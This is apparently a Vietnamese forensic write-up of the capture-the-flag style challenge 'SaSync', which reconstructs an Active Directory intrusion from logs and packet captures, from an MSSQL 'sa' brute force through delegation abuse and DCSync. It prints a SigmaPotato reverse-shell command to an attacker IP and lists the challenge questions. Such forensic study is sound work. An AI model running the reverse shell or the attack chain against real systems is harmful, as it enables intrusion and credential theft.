![image](https://hackmd.io/_uploads/r1qGj-qifx.png)
Bạn là IR bị đánh thức lúc 02:00 sáng bởi máy nhắn tin của bạn. Nhóm SOC đã báo cáo một sự cố có nguy cơ cao ảnh hưởng đến môi trường ShanoCorp Active Directory. Attacker đã tấn công một domain con bị bỏ quên đã được giữ lại cho mục đích thử nghiệm, trong đó các cấu hình không an toàn bị lộ
# SaSync
## Sherlock info
Name |SaSync
|-|-|
Difficulty| Medium
Category | DFIR|
## Note from Scenario

## Artifacts
Arrtifact bao gồm:
- Event Log của 2 thiết bị: `DC2` VÀ `SqlSvr`
- File pcap ghi lại traffic của 2 thiết bị 
## Tools use
- Chatgpt

>### Comment
> Bài này khoai vì là AD, phải prompt Chatgpt rất nhiều

# Question
1. When did the earliest malicious activity on the target system occur?
2. What is the internal IP address of the compromised asset from where the attack originated to the server?
3. Which service was attacked and compromised by the attacker?
4. When did the attacker successfully execute the first remote command on the server?
5. What is the full path of the parent process that facilitated the attacker's command execution during the initial foothold?
6. Attacker downloaded a binary to facilitate persistent reverse shell on the server. What is the full URL from where it was downloaded?
7. When was the reverse shell successfully executed and gave fully interactive access to the attacker?
8. The attacker performed privilege escalation by exploiting known Windows vulnerabilities. What is the full command that was used to gain higher privileges?
9. The attacker exfiltrated sensitive Operating System files from the server to the compromised Developer Test machine which is believed to be the BeachHead. What is the full command that was used to establish a remote connection between both machines and stage for exfiltration
10. The Attacker enumerated user profiles on the server, for horizontal lateral movement and expanding the compromise scope from local accounts to domain accounts. When was enumeration done?
11. The attacker performed a credential stuffing attack in order to gain access to a domain account. When did the attacker successfully compromise the first domain account?
12. The attacker used Active Directory exploitation tools, and compromised a second domain account without needing the password. Which account was this?
13. The attacker abused an Active directory misconfiguration to escalate to domain wide privileges utilizing the second compromised domain account. What is the Logon GUID associated with this escalated privileged session on the domain controller
14. What is the Active Directory feature that was abused to impersonate the domain admin account, and what Kerberos extension made this possible?
15. The attacker moved laterally to the Domain Controller using a well-known administrative tool to establish interactive SYSTEM-level access. What is the time at which this event occurred?
16. The attacker abused another misconfiguration to achieve domain wide compromise. When was the misconfiguration sucessfully abused?
17. Which enumeration command did the attacker run allowing them to potentially gain information of trust relationships between the compromised domain and other domains in the network.
# Analysis
## Phase 1: Reconnaissance (scan nội bộ)
Qua Conversations của pcap, IP `192.168.186.135` gửi hàng loạt gói tin tới `192.168.186.139`. Cả hai thuộc cùng một dải mạng, nên đây là hành vi scan **nội bộ**, không phải từ Internet
![Ảnh 1: Conversations](https://hackmd.io/_uploads/HkJ1kG9iGg.png)
Lưu lượng tần suất cao với các cờ `SYN` và `RST, ACK` là đặc trưng của **port scan** (kiểu SYN scan): `SYN` đi, cổng đóng thì phản hồi `RST, ACK`, cổng mở thì phản hồi `SYN, ACK`
![Ảnh 2: SYN/RST,ACK](https://hackmd.io/_uploads/r1yfgMqjMx.png)
**Thời điểm bắt đầu scan:** `2026-03-09 19:26:26`
## Phase 2: Initial Access - brute-force MSSQL
### Xác định máy nạn nhân ban đầu
Artifact đến từ một DC và một SQL Server, nên khả năng cao SQL Server (`.139`) là máy bị tác động đầu tiên. Dịch vụ `MSSQL` được tìm thấy trong **Application log** (log ghi lại hoạt động của app/seevice: thông tin, cảnh báo, lỗi), xác nhận máy này đang chạy SQL Server
![Ảnh 3: Application log - MSSQL](https://hackmd.io/_uploads/SkXrVGcjze.png)
### 3.2 Security log bị xóa, chuyển sang Application log
Theo hướng điều tra thông thường, lệnh đầu tiên của attacker sẽ nằm ở Security log. Tuy nhiên log này có event **xóa log** (Event ID `1102`), nên dữ liệu trước thời điểm đó không còn
![Ảnh 4: Event xóa log](https://hackmd.io/_uploads/S1tR4z5ozg.png)
Vì Security log không đủ, mình chuyển sang Application log. Tại đây ghi nhận chuỗi **login fail với user `sa`** bắt đầu lúc `19:27:01`. Việc nhắm vào `sa` cho thấy attacker brute-force để có quyền sử dụng `xp_cmdshell`, từ đó thực thi lệnh hệ điều hành
![Ảnh 5: Login fail user sa](https://hackmd.io/_uploads/SJXP_GqoGe.png)
## 4. Phase 3: Execution - RCE qua xp\_cmdshell
Lấy `19:27:01` làm pivot rồi quay lại Security log: lúc `19:27:26`, `cmd.exe` được tạo với process cha là `sqlservr.exe` (`C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\sqlservr.exe`). Việc `cmd.exe` sinh ra từ process SQL Server là dấu hiệu điển hình của `xp_cmdshell`, và chứng tỏ brute-force đã thành công. Lệnh đầu tiên là liệt kê file trong `C:\`
![Ảnh 6: cmd.exe từ sqlservr.exe](https://hackmd.io/_uploads/SJjcnM9jGg.png)
Trên pcap, event này xuất hiện sớm hơn khoảng 2 giây so với Security log. **Dùng mốc pcap làm đáp án** (độ trễ ghi event và đồng hồ hai nguồn có thể lệch nhau)
![Ảnh 7: Thời gian trên pcap](https://hackmd.io/_uploads/ryQld45szl.png)
## Phase 4: Tải công cụ và dựng Reverse Shell
1. Attacker tạo folder `Temp` làm **staging folder** để chứa công cụ
![Ảnh 8](https://hackmd.io/_uploads/SJQO6M5iGx.png)
2. Lúc `19:27:50`, file `nc.exe` (Netcat) được tải về. Đây là công cụ mạng đa dụng, ở đây dùng để dựng reverse shell ![Ảnh 9](https://hackmd.io/_uploads/rk8oTz9sfx.png)
3. Sau khi tải xong, attacker tạo reverse shell kết nối về `192.168.186.135` port `4444`
![Ảnh 10a](https://hackmd.io/_uploads/BkBPAM5sGx.png)
![Ảnh 10b](https://hackmd.io/_uploads/rJuc0f9sMx.png)
4. Khoảng 9 giây sau, shell được spawn và attacker chạy `whoami /priv` để kiểm tra quyền của tài khoản dịch vụ SQL Server. Pcap xác nhận shell được thiết lập lúc `2026-03-09 19:27:59`, khớp với khoảng 9 giây kể từ `19:27:50`
![Ảnh 11](https://hackmd.io/_uploads/rynaAMqjfe.png), ![Ảnh 12](https://hackmd.io/_uploads/rk6OYVcsMe.png)
## Phase 5: Privilege Escalation - SigmaPotato
Kết quả `whoami /priv` thường cho thấy tài khoản dịch vụ SQL có đặc quyền `SeImpersonatePrivilege`. Đây là điều kiện để dùng họ công cụ **Potato** (lạm dụng cơ chế impersonation của Windows để nâng lên SYSTEM). Attacker tải `SigmaPotato.exe` 
![Ảnh 13](https://hackmd.io/_uploads/BJXv1m9sGg.png))
và chạy lệnh sau, tạo một reverse shell mới (port `5555`) mang quyền SYSTEM:
```
.\SigmaPotato.exe --revshell 192.168.186.135 5555
```
![Ảnh 14: lệnh thực thi](https://hackmd.io/_uploads/ry84w79ifl.png)
Lúc `19:28:55`, attacker leo thang thành công lên `SYSTEM`
![Ảnh 15](https://hackmd.io/_uploads/HJHhvXcjzg.png)
## Phase 6: Discovery và Credential Access trên máy `.139`
1. Attacker kết nối tới share folder trên máy `192.168.186.135` (máy của attacker) bằng tài khoản `dev01` và ánh xạ thành ổ đĩa `N:`. Ổ này đóng vai trò kênh trung chuyển file giữa hai máy
![Ảnh 16](https://hackmd.io/_uploads/rkv7_X5jzg.png)
2. Enum người dùng trên hệ thống bằng `dir` vào folder `Users`
![Ảnh 17a](https://hackmd.io/_uploads/SyVsq45ifg.png)
![Ảnh 17b](https://hackmd.io/_uploads/HJPP-r5jMe.png)
3. Follow stream cho thấy hành vi **dump SAM** để lấy credential cục bo
![Ảnh 18](https://hackmd.io/_uploads/SJw9WSqjGe.png)
## Phase 7: Lateral Movement tới `rumen.katincharov`
Sau khi enum user, attacker thử chuyển sang tài khoản `rumen.katincharov`
![Ảnh 19](https://hackmd.io/_uploads/BJhGzB5ife.png)
**Thời điểm tấn công mật khẩu:** `19:31:01`. DC2 ghi nhận lỗi xác thực với status `0xc000006a` (sai mật khẩu)
![Ảnh 20](https://hackmd.io/_uploads/ByxLSwijfx.png)
**Thời điểm bị chiếm** phải xác định ở DC: event `4776` (NTLM credential validation) với `Status: 0x0` nghĩa là mật khẩu đúng, tức tài khoản đã bị chiếm
![Ảnh 21](https://hackmd.io/_uploads/rJLMPDiszl.png)
## Phase 8: Shadow Credentials, chiếm `websvc`
Sau khi có `rumen.katincharov`, mình tìm tài khoản **mới xuất hiện trong Kerberos** từ `.135`. Event `4768` (TGT request) trên DC2 cho thấy tài khoản lạ `websvc`, trước đó chưa từng xuất hiện, vào lúc `19:32:40`
![Ảnh 24](https://hackmd.io/_uploads/BJdJ6DioMg.png)
Để biết attacker lấy được `websvc` bằng cách nào mà không có mật khẩu, kiểm tra pcap và thấy một LDAP `modifyRequest` ghi vào thuộc tính `msDS-KeyCredentialLink` lúc `19:32:03` (**trước** event `4768` khoảng 37 giây, đúng thứ tự của chuỗi tấn công). Đây là dấu hiệu của **Shadow Credentials**:
1. `rumen.katincharov` có quyền ghi
2. Attacker thêm một key credential của mình vào `msDS-KeyCredentialLink`
3. Attacker xin TGT bằng **PKINIT** (xác thực bằng chứng chỉ/khóa), không cần biết mật khẩu của `websvc`
## Phase 9: Delegation Abuse, mạo danh Administrator
### Đặt vấn đề
`websvc` chỉ là tài khoản dịch vụ thông thường, không phải Domain Admin. Câu hỏi: làm sao từ một tài khoản như vậy nhảy lên quyền `Administrator` mà không cần mật khẩu của Administrator?

Đây là mô hình lạm dụng **Kerberos Delegation** kinh điển: nếu một tài khoản dịch vụ được phép delegate tới một dịch vụ khác, nó có thể xin vé **thay mặt** bất kỳ người dùng nào (kể cả Administrator) để truy cập dịch vụ đó
### Cơ chế S4U
- **S4U2Self:** dịch vụ (`websvc`) xin cho chính nó một vé mang danh người dùng mục tiêu (`Administrator`). Dấu hiệu trong pcap: padata type `129` (`PA-FOR-USER`)
- **S4U2Proxy:** dùng vé ở bước trên để xin tiếp vé tới dịch vụ đích (ở đây là `DC2`), vé này cho phép `Administrator` đăng nhập vào DC2. Dấu hiệu trong pcap: padata type `167` (`PA-PAC-OPTIONS`)
### Bằng chứng trên DC2
Từ giả thuyết "xin vé thay mặt người khác", ta tìm event `4769` (Kerberos Service Ticket Request) trên DC2, vì đây là loại event ghi mọi yêu cầu vé dịch vụ, gồm cả giao dịch S4U. Trường `Transited Services` trên vé của `Administrator` trỏ về `websvc@DB-TEST...` là bằng chứng `websvc` đóng vai trung gian xin vé thay cho `Administrator`

Đối chiếu tiếp với event `4624` của tài khoản đặc quyền trên DC2 có nguồn `.135`: trường `TransmittedServices` (chỉ xuất hiện khi dùng S4U/delegation) có giá trị `websvc`. Điều này chứng minh phiên `Administrator` được tạo từ ticket `websvc` xin thay mặt (`S4U2Proxy`). Ba event `4624` tiếp theo (`19:36:58`) dùng cùng `LogonGuid`, cho thấy cùng một phiên
![Ảnh 25](https://hackmd.io/_uploads/ry-hfdojMx.png)
## Phase 10: Execution trên DC2 và chuẩn bị DCSync
Có quyền `Administrator` trên DC2, attacker dùng **impacket-psexec** để chạy lệnh với quyền SYSTEM. Dấu ấn nhận biết: process được tạo từ một **service có tên ngẫu nhiên 4 ký tự**, file thực thi **ngẫu nhiên 8 ký tự**
![Ảnh 22](https://hackmd.io/_uploads/r1vuKvjjMe.png)
Sau đó là hàng loạt lệnh kiểm tra quyền (`whoami /priv`) và tải **mimikatz**
![Ảnh 23](https://hackmd.io/_uploads/HkrL5Pjjfx.png)
## Phase 11: Credential Dumping, DCSync
Mục tiêu của bước trước là DCSync. Trong Security log, đây là event `4662` với các GUID quyền replication đặc trưng:
![Ảnh 26](https://hackmd.io/_uploads/H14vouisMx.png)
| GUID | Quyền |
| --- | --- |
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes` |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes-All` |

Quyền `Get-Changes-All` là điều kiện bắt buộc để rút secret (hash của tài khoản, gồm `krbtgt`). Bộ ba event cùng thời điểm `19:39:50` là mẫu điển hình của **DCSync thành công**. `Subject` là `DC2$` vì mimikatz chạy bằng SYSTEM trên chính DC, nên mang danh machine account
![Ảnh 27](https://hackmd.io/_uploads/B1F43djszg.png)
## Phase 12: Trust Discovery (hướng tới `shanocorp.htb`)
Sau khi chiếm xong một domain, bước hợp lý tiếp theo là xem quan hệ **trust** để mở rộng sang domain `shanocorp.htb`. Lệnh enum thường chạy ở `cmd.exe` hoặc PowerShell
![Ảnh 28a](https://hackmd.io/_uploads/rJG7COsozl.png)
![Ảnh 28b](https://hackmd.io/_uploads/SkENCujozl.png)
- `Get-ADForest` liệt kê các domain trong forest
- `Get-ADTrust` liệt kê các quan hệ trust
––––––––––––––––––––– Kết thúc Sherlock! –––––––––––––––––––––
![image](https://hackmd.io/_uploads/By88COsozx.png)
